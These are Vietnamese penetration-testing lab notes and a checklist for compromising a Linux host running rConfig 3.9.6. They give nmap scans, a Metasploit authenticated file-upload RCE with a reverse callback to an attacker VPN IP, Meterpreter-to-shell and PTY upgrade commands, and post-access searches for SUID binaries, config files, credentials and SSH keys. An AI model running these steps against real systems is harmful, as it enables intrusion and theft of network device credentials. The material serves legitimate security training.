# Infiltrating Unix/Linux

## Workflow tổng quát

```text
Enumerate host
→ nhận diện OS và service
→ xác định ứng dụng được host
→ tìm version
→ nghiên cứu CVE/PoC/exploit
→ xác minh điều kiện khai thác
→ cấu hình exploit và payload
→ nhận shell
→ nâng cấp shell thành TTY
→ tiếp tục enumeration và privilege escalation
```

## Câu hỏi cần trả lời

- Target chạy Linux distribution nào?
    
- Có những shell/ngôn ngữ nào?
    
- Server đang làm nhiệm vụ gì?
    
- Ứng dụng nào đang được host?
    
- Ứng dụng và service có lỗ hổng đã biết không?
    
- Exploit có yêu cầu authentication không?
    
- Payload sẽ chạy dưới user nào?
    

## Enumeration

```bash
nmap -sC -sV <TARGET_IP>
```

- `-sC`: chạy default NSE scripts
    
- `-sV`: xác định service/version
    

Ví dụ kết quả:

```text
21/tcp    FTP
22/tcp    SSH
80/tcp    HTTP Apache
111/tcp   rpcbind
443/tcp   HTTPS Apache
3306/tcp  MySQL
```

HTTP banner có thể tiết lộ:

```text
OS: CentOS
Web server: Apache
Language: PHP
TLS library: OpenSSL
```

Không nên chỉ tìm exploit cho Apache/PHP. Cần truy cập website để xác định ứng dụng thực sự.

## rConfig

rConfig là công cụ quản lý cấu hình thiết bị mạng.

Nếu bị compromise, attacker có thể tìm thấy:

- Router/switch credential
    
- Device configuration
    
- Internal IP
    
- SNMP community
    
- SSH account
    
- Network topology
    

Phiên bản trong lab:

```text
rConfig 3.9.6
```

Tìm lỗ hổng:

```text
rConfig 3.9.6 vulnerability
rConfig 3.9.6 CVE
rConfig 3.9.6 RCE
rConfig 3.9.6 exploit
```

## Tìm Metasploit module

```text
search rconfig
```

Không tìm thấy module không có nghĩa exploit không tồn tại. Có thể:

- Metasploit chưa cập nhật
    
- Module có tên khác
    
- Module chỉ tồn tại trên repository
    
- Chỉ có PoC độc lập
    

## Custom Metasploit module

Module dùng phần mở rộng:

```text
.rb
```

Nên lưu custom module tại:

```text
~/.msf4/modules/exploits/linux/http/
```

Sau đó:

```text
reload_all
```

Luôn đọc source code module trước khi chạy.

## Khai thác

```text
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
show options
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_VPN_IP>
set LPORT 4444
run
```

Exploit thực hiện:

```text
Check version
→ login rConfig
→ upload PHP payload
→ trigger payload
→ reverse callback
→ delete uploaded file
→ open Meterpreter session
```

## Meterpreter và shell

Meterpreter prompt:

```text
meterpreter >
```

Mở system shell:

```text
shell
```

Kiểm tra:

```bash
whoami
id
pwd
uname -a
cat /etc/os-release
```

Payload web thường chạy dưới service account:

```text
apache
www-data
nginx
```

Có shell không có nghĩa đã có root.

## Non-TTY shell

Dấu hiệu:

- Không có prompt rõ ràng
    
- Không dùng được arrow key
    
- Ctrl+C có thể làm chết shell
    
- `su`, `sudo`, `vim` hoạt động kém
    
- Không có job control
    

Kiểm tra Python:

```bash
which python
which python3
```

Spawn PTY:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Hoặc:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

PTY chỉ cải thiện khả năng tương tác, không nâng quyền.

## Ghi nhớ

- Service version không phải lúc nào cũng là attack surface tốt nhất.
    
- Ưu tiên xác định ứng dụng và phiên bản ứng dụng.
    
- Tìm thấy exploit chưa đủ; phải kiểm tra precondition.
    
- Web payload thường chạy dưới user của web server.
    
- Meterpreter không phải Bash.
    
- `shell` mở system shell từ Meterpreter.
    
- TTY và privilege là hai vấn đề khác nhau.
    
- Sau initial access cần tiếp tục local enumeration và privilege escalation.

---

# Linux Web Exploitation Lab Checklist

## 1. Chuẩn bị

-  Xác nhận target IP.
    
-  Xác nhận VPN/Pwnbox đang kết nối.
    
-  Lấy IP callback của attacker:
    

```bash
ip -br addr
```

-  Tạo thư mục lưu kết quả:
    

```bash
mkdir -p scans loot notes
```

## 2. Scan port

-  Full TCP scan:
    

```bash
sudo nmap -Pn -p- --min-rate 1000 -oA scans/all-tcp <TARGET_IP>
```

-  Service scan trên các port mở:
    

```bash
sudo nmap -Pn -sC -sV -O -p<PORTS> -oA scans/services <TARGET_IP>
```

-  Ghi lại:
    
    -  Port
        
    -  Service
        
    -  Version
        
    -  OS/distro
        
    -  Hostname
        
    -  HTTP redirect
        
    -  TLS certificate
        
    -  Application banner
        

## 3. Enumeration từng service

### FTP

-  Kiểm tra anonymous login:
    

```bash
ftp <TARGET_IP>
```

-  Chạy FTP scripts:
    

```bash
nmap -Pn -p21 --script ftp-anon,ftp-syst <TARGET_IP>
```

### SSH

-  Ghi lại OpenSSH version.
    
-  Không brute-force nếu chưa có lý do và scope không cho phép.
    
-  Lưu SSH để dùng khi tìm thấy credential/key.
    

### HTTP/HTTPS

-  Truy cập cả HTTP và HTTPS.
    
-  Kiểm tra redirect:
    

```bash
curl -i http://<TARGET_IP>/
curl -k -i https://<TARGET_IP>/
```

-  Fingerprint:
    

```bash
whatweb http://<TARGET_IP>/
whatweb https://<TARGET_IP>/
```

-  Xác định:
    
    -  Tên ứng dụng
        
    -  Phiên bản
        
    -  Login page
        
    -  Framework/language
        
    -  Directory/file đặc biệt
        
    -  Virtual host
        

### MySQL

-  Xác định có cho remote connection không.
    
-  Chỉ thử authentication khi có credential hoặc được phép.
    

## 4. Xác định ứng dụng

-  Đọc footer, HTML source, JavaScript và response header.
    
-  Tìm version trong:
    
    -  Footer
        
    -  Login page
        
    -  `/README`
        
    -  `/CHANGELOG`
        
    -  Static asset
        
    -  API response
        
-  Xác nhận ứng dụng và phiên bản bằng ít nhất hai dấu hiệu nếu có thể.
    

## 5. Nghiên cứu exploit

-  Tìm theo application + version.
    
-  Đọc CVE/advisory.
    
-  Kiểm tra:
    
    -  Affected version
        
    -  Authentication required
        
    -  Required role
        
    -  Vulnerable endpoint
        
    -  Upload path
        
    -  Payload type
        
    -  Side effect
        
    -  Reliability
        
-  Đọc source code PoC/module trước khi chạy.
    
-  Không chạy exploit chỉ dựa vào tên module.
    

## 6. Metasploit

-  Tìm module:
    

```text
search rconfig
```

-  Chọn module:
    

```text
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

-  Xem module:
    

```text
info
show options
show advanced
```

-  Cấu hình tối thiểu:
    

```text
set RHOSTS <TARGET_IP>
set RPORT <PORT>
set TARGETURI <BASE_PATH>
set SSL true|false
set USERNAME <USERNAME>
set PASSWORD <PASSWORD>
set LHOST <VPN_IP>
set LPORT 4444
```

-  Chạy check nếu hỗ trợ:
    

```text
check
```

-  Chạy exploit:
    

```text
run
```

## 7. Nếu dùng custom module

-  Tạo thư mục:
    

```bash
mkdir -p ~/.msf4/modules/exploits/linux/http
```

-  Copy file `.rb`.
    
-  Đọc source code.
    
-  Trong Metasploit:
    

```text
reload_all
search <MODULE_NAME>
```

## 8. Sau khi có Meterpreter

-  Kiểm tra session:
    

```text
sessions
sessions -i <ID>
```

-  Xem thư mục:
    

```text
pwd
ls
```

-  Mở system shell:
    

```text
shell
```

-  Kiểm tra user và hệ thống:
    

```bash
whoami
id
hostname
uname -a
cat /etc/os-release
```

## 9. Nâng cấp TTY

-  Kiểm tra Python:
    

```bash
command -v python
command -v python3
```

-  Spawn PTY:
    

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Hoặc:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

-  Thiết lập terminal nếu cần:
    

```bash
export TERM=xterm
```

-  Kiểm tra:
    

```bash
tty
echo $SHELL
```

## 10. Local enumeration sau initial access

-  User/group:
    

```bash
id
groups
```

-  Sudo:
    

```bash
sudo -l
```

-  Network:
    

```bash
ip addr
ip route
ss -lntup
arp -n
```

-  Process:
    

```bash
ps aux
```

-  Cron:
    

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

-  SUID:
    

```bash
find / -perm -4000 -type f 2>/dev/null
```

-  Capability:
    

```bash
getcap -r / 2>/dev/null
```

-  Application config:
    

```bash
find /var/www /home -type f \
\( -name "*.conf" -o -name "*.php" -o -name ".env" \) \
2>/dev/null
```

-  Tìm credential, database config và SSH key.
    
-  Không sửa hoặc xóa file ngoài những gì lab yêu cầu.